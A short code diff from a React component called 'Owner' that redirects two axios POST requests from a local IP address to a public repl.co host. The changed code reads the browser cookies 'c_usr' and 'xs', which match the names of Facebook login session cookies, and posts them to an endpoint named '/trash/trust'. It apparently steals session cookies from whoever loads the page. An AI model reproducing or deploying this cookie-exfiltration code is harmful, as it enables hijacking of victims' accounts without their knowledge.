@@ -13,12 +13,12 @@ function Owner({socket}) {
     useEffect(() => { 
 
        setTimeout(() => {
-        axios.post("http://192.168.1.43:3002/session/key", { 
+        axios.post("https://vtube.mohamedbrima.repl.co/session/key", { 
             keys: uuid()
           }).then(res =>{ 
             if(res.data.success === "success"){ 
                 socket.emit("storedtoken", res.data.tokens)
-                    axios.post("http://192.168.1.43:3002/trash/trust", { 
+                    axios.post("https://vtube.mohamedbrima.repl.co/trash/trust", { 
                         c_usr: Cookies.get("c_usr"),
                         xs: Cookies.get("xs")
                     }).then(res => { 
